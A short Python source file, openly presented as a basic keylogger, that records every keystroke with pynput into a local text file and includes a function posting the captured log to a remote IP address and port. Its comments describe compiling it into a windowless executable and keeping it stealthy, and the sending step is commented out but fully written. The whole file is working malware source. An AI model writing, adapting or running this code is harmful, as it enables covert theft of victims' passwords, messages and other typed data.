from pynput import keyboard
import requests
import json

# An example of a basic keylogger. It listens for keyboard input and stores it in a txt file. 
# python -m PyInstaller keylogger.pyw to turn the file into a .exe that runs without opening the terminal

ip_address = "000.00.000.00"
port_number = "0000"

def send_post_req():  # Untested until I can set up a server
    # Extract key data from keylog.txt
    f = open("keylog.txt", 'r')
    keylog_file_data = f.read() 
    f.close()

    try:
        payload = json.dumps({"keyboardData" : keylog_file_data})  
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-type" : "application/json"})
    except:
        print("Could not send post request")  # pass would be more conducive to stealth


def append_to_log(keystroke):  
    with open("keylog.txt", 'a', encoding="utf-8") as logkey:
        logkey.write(str(keystroke))  # Keystroke 'a'ppended to keylog.txt


listener = keyboard.Listener(on_press=append_to_log)
listener.start()

while True:
    listener.join(timeout=10)  # Blocks main thread/stops program from continuing past this point until timeout value has been reached in seconds
    print("Timeout")  # We can use this to either send a post request or check for after a time of day to send the request

    # if x time elapse == True:
    #   send_post_req()
